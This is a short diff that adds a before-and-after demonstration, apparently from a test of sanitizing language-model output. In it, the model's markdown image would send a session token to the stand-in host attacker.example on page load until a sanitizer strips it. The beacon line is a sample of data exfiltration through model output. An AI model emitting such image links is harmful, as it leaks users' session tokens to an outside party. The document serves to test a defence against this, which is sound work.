@@ -1,0 +1,9 @@
+== before: the model output goes straight to the page ==
+  the page receives: ![Data Sync](http://attacker.example/log?d=SESSION-TOKEN-9)
+  the beacon host "attacker.example" reaches the browser: true (it fetches on page load)
+
+== after: sanitize the model output first ==
+  the page receives: [IMAGE BLOCKED BY SANITIZER]
+  image/link tags removed: 2; the beacon host reaches the browser: false
+
+attack blocked (the receipt): the pixel reaches the browser raw, stripped once the output is sanitized
